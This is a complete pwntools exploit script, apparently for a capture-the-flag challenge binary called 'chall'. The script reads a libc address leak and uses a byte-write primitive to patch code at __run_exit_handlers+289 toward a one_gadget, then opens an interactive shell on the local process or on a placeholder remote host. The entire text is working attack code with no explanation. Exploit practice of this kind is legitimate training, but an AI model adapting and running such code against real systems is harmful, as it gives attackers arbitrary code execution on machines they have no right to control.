#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
b *main+660
b *__run_exit_handlers+256
b *__run_exit_handlers+289
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses

# one gadget relative offset:
one_gadget_roffset_1 = 0x05
one_gadget_roffset_2 = 0x7b
__run_exit_handlers_289 = 0x47a21

# Functions
def write_byte(address: int, byte: int):
    io.sendlineafter(b"wish?", hex(address).encode())
    io.sendlineafter(b"here?", hex(byte).encode())
    

io = start()

libc_leak = io.recvline_contains(b"libc.so.6").split(b'-')
libc_base = int(libc_leak[0], 16)
log.info("Libc base @ %s" % hex(libc_base))

target = libc_base + __run_exit_handlers_289
log.info("run_exit_handlers_289 @ %s" % hex(target))

write_byte(target+1, one_gadget_roffset_1)
write_byte(target+2, one_gadget_roffset_2)

io.interactive()
